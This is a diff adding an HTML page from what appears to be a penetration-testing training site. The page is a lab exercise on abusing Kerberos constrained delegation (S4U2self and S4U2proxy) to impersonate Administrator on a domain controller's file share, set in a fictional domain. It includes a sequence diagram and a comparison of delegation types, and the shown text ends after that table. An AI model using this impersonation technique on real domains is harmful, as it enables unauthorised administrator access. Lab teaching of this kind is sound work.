@@ -1,0 +1,1860 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Linux penetration testing exercises for OpenCyberRange">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>Exercise 4.4: Constrained Delegation Abuse - Linux Penetration Testing</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css?v=4">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="light-green">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#exercise-44-constrained-delegation-abuse" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Linux Penetration Testing" class="md-header__button md-logo" aria-label="Linux Penetration Testing" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Linux Penetration Testing
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Exercise 4.4: Constrained Delegation Abuse
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="light-green"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="green" data-md-color-accent="light-green"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Linux Penetration Testing" class="md-nav__button md-logo" aria-label="Linux Penetration Testing" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Linux Penetration Testing
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH L1 -- Linux Service Enumeration
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH L1 -- Linux Service Enumeration
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN01_Linux_Service_Enumeration/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN01_Linux_Service_Enumeration/01_SSH_Service_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L1.1 -- SSH Service Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN01_Linux_Service_Enumeration/02_Multi_Service_Discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L1.2 -- Multi-Service Discovery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN01_Linux_Service_Enumeration/03_Service_Interaction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L1.3 -- Service Interaction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN01_Linux_Service_Enumeration/04_Non_Standard_Port_Discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L1.4 -- Non-Standard Port Discovery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN01_Linux_Service_Enumeration/05_NSE_Script_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L1.5 -- NSE Script Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN01_Linux_Service_Enumeration/06_Version_Vulnerability_Identification/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L1.6 -- Version Vulnerability Identification
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN01_Linux_Service_Enumeration/07_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH L2 -- SSH Authentication
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH L2 -- SSH Authentication
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN02_SSH_Authentication/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN02_SSH_Authentication/01_SSH_Basic_Login/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L2.1 -- SSH Basic Login
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN02_SSH_Authentication/02_SSH_User_Discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L2.2 -- SSH User Discovery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN02_SSH_Authentication/03_SSH_File_Discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L2.3 -- SSH File Discovery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN02_SSH_Authentication/04_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH L3 -- SSH Post-Exploitation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH L3 -- SSH Post-Exploitation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN03_SSH_Post_Exploitation/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN03_SSH_Post_Exploitation/01_SSH_Command_Execution/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L3.1 -- SSH Command Execution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN03_SSH_Post_Exploitation/02_SSH_History_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L3.2 -- SSH History Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN03_SSH_Post_Exploitation/03_SSH_Privilege_Escalation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L3.3 -- SSH Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN03_SSH_Post_Exploitation/04_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#before-you-begin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Before You Begin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#your-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Your Objectives
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Your Objectives">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#s4u2self-s4u2proxy-in-one-picture" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        S4U2self + S4U2proxy In One Picture
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#three-delegation-types-compared" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Three Delegation Types Compared
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#background-three-kinds-of-delegation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background: Three Kinds of Delegation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Background: Three Kinds of Delegation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-s4u2self-s4u2proxy-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The S4U2self / S4U2proxy flow
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-cifs-on-a-dc-is-the-worst-case-target" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why CIFS on a DC is the worst-case target
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tool-primer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tool Primer
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tool Primer">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ldap-enumeration-of-constrained-delegation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LDAP enumeration of constrained delegation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#getstpy-for-s4u2self-s4u2proxy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        getST.py for S4U2self + S4U2proxy
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-the-resulting-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Using the resulting ticket
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Walkthrough">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-find-constrained-delegation-with-t2a4d-accounts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1: Find Constrained-Delegation-with-T2A4D Accounts
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-obtain-the-source-credential" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2: Obtain the Source Credential
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-run-s4u2self-s4u2proxy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3: Run S4U2self + S4U2proxy
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-use-the-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4: Use the Ticket
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-submit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 5: Submit
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blue-team-perspective" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blue Team Perspective
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hardening-note" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hardening Note
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Hardening Note">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#record-your-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Record Your Findings
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis-questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Analysis Questions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Takeaways
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cheat-sheet-recap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cheat Sheet Recap
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#spaced-repetition" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Spaced Repetition
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="exercise-44-constrained-delegation-abuse">Exercise 4.4: Constrained Delegation Abuse</h1>
+<h2 id="before-you-begin">Before You Begin</h2>
+<p>Constrained delegation is a Kerberos feature that lets an account impersonate any user when authenticating to a specifically allowed list of services. The original use case was a web app that authenticates to a database on behalf of the connected user without the user re-authenticating. The abuse case: if you compromise an account that is configured for constrained delegation to a powerful service (CIFS on a DC, HTTP on AD CS, MSSQL on a sensitive database), you can use S4U2self followed by S4U2proxy to impersonate any user (including Domain Admins) when authenticating to that service.</p>
+<p>Exercise 4.4 gives you the credential of <code>svc_deleg_&lt;token&gt;</code>, an account with <code>msDS-AllowedToDelegateTo</code> containing <code>cifs/corp-dc01</code>. Impersonate <code>Administrator</code>, mount the DC's C$ as Administrator, and read your per-token flag file.</p>
+<p><strong>Tools required:</strong> <code>impacket-getST</code> (often <code>getST.py</code>), <code>smbclient</code>, <code>klist</code>, <code>ldapsearch</code>. Pre-installed on Kali.</p>
+<h2 id="scenario">Scenario</h2>
+<p>Marcus Bell: "Constrained delegation says 'this account may impersonate any user, but only to these specific services.' If one of those services is the DC's CIFS share, you have a path to anything that account is allowed to delegate."</p>
+<p>Per-student: <code>svc_deleg_&lt;token&gt;</code> has a seeded credential (visible in the lab dashboard or recoverable from earlier exercises). Use it to impersonate Administrator and read <code>C:\flag_&lt;token&gt;.txt</code>.</p>
+<p><strong>Credentials:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+<th>Source</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>svc_deleg_&lt;token&gt;</code></td>
+<td>(per-token, see lab dashboard)</td>
+<td>Provided / earlier exercise</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Domain:</strong> <code>corp.nordport.local</code></p>
+<h2 id="your-objectives">Your Objectives</h2>
+<ul>
+<li>Identify accounts with <code>msDS-AllowedToDelegateTo</code> set</li>
+<li>Confirm <code>svc_deleg_&lt;token&gt;</code> delegates to <code>cifs/corp-dc01</code></li>
+<li>Use <code>getST.py -impersonate Administrator</code> to obtain a TGS for <code>cifs/corp-dc01</code> as Administrator</li>
+<li>Use the ticket to read <code>\\corp-dc01\C$\flag_&lt;token&gt;.txt</code></li>
+</ul>
+<h3 id="s4u2self-s4u2proxy-in-one-picture">S4U2self + S4U2proxy In One Picture</h3>
+<p>The two extension messages are the entire attack. The diagram below shows what each does and why the combination yields impersonation.</p>
+<pre class="mermaid"><code>sequenceDiagram
+    autonumber
+    participant A as Attacker (svc_deleg)
+    participant K as KDC
+    participant T as Target (cifs/corp-dc01)
+
+    A-&gt;&gt;K: AS-REQ for svc_deleg
+    K--&gt;&gt;A: TGT_svc_deleg
+
+    Note over A,K: S4U2self -- "give me a TGS to MYSELF as Administrator"
+    A-&gt;&gt;K: TGS-REQ (sname=svc_deleg, S4U2self for Administrator)&lt;br/&gt;TGT_svc_deleg in padata
+    K--&gt;&gt;A: TGS_admin_to_svc_deleg&lt;br/&gt;(forwardable, signs PAC for Administrator)
+
+    Note over A,K: S4U2proxy -- "use that TGS to get a ticket to cifs/corp-dc01"
+    A-&gt;&gt;K: TGS-REQ (sname=cifs/corp-dc01)&lt;br/&gt;TGS_admin_to_svc_deleg in padata
+    K--&gt;&gt;A: TGS_admin_to_cifs&lt;br/&gt;(only because cifs/corp-dc01 is in msDS-AllowedToDelegateTo)
+
+    A-&gt;&gt;T: AP-REQ via SMB with TGS_admin_to_cifs
+    T--&gt;&gt;A: SMB session as Administrator</code></pre>
+<h3 id="three-delegation-types-compared">Three Delegation Types Compared</h3>
+<p>The four delegation flavors look similar at the protocol level but have very different attack footprints. The table below tells you what to look for in <code>userAccountControl</code> and which message to abuse.</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>UAC bit / attribute</th>
+<th>What you need</th>
+<th>What you abuse</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Unconstrained</td>
+<td><code>TRUSTED_FOR_DELEGATION</code> (524288)</td>
+<td>A user authenticates to the host</td>
+<td>Captured forwardable TGT</td>
+</tr>
+<tr>
+<td>Constrained (no PT)</td>
+<td><code>msDS-AllowedToDelegateTo</code> populated</td>
+<td>A target user TGT (forwardable)</td>
+<td>S4U2proxy only</td>
+</tr>
+<tr>
+<td>Constrained (with PT)</td>
+<td><code>msDS-AllowedToDelegateTo</code> + <code>T2A4D</code> (16777216)</td>
+<td>Just the source credential</td>
+<td>S4U2self -&gt; S4U2proxy (this exercise)</td>
+</tr>
+<tr>
+<td>RBCD</td>
+<td><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on target</td>
+<td>Compromised computer object</td>
+<td>Self-trust (covered in 4.5)</td>
+</tr>
+</tbody>
+</table>
+<hr />
